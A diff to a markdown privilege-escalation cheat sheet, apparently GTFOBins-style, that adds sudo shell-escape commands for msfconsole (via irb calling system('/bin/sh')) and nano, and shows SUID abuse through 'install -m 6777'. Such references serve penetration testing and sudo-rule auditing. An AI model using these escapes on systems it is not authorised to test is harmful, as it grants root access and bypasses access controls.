@@ -82,7 +82,7 @@
   ```
 
 ### ♦ `install` :
-   ⇨ The `install` command can change permissions and execute a copy of the file with elevated privileges. If it has the SUID bit set, it can escalate privileges.
+     The `install` command can change permissions and execute a copy of the file with elevated privileges. If it has the SUID bit set, it can escalate privileges.
 
 **Commands:**
 • SUID:
@@ -100,3 +100,32 @@
   sudo install -m 6777 $LFILE $TF
   ```
 
+### ♦ `msfconsole` :
+   ⇨ The `msfconsole` can spawn a Ruby interpreter to break out of restricted environments and escalate privileges.
+
+**Commands:**
+• Shell:
+  ```sh
+  sudo msfconsole
+  msf6 > irb
+  >> system("/bin/sh")
+  ```
+• Sudo:
+  ```sh
+  sudo msfconsole
+  msf6 > irb
+  >> system("/bin/sh")
+  ```
+
+### ♦ `nano`
+   ⇨ The `nano` text editor can be exploited to spawn a shell with elevated privileges if allowed to run as superuser.
+
+**Commands:**
+• Sudo:
+  ```sh
+  sudo nano
+  ```
+  - In nano, press `Ctrl+R` then `Ctrl+X`, then type:
+  ```sh
+  reset; sh 1>&0 2>&0
+  ```
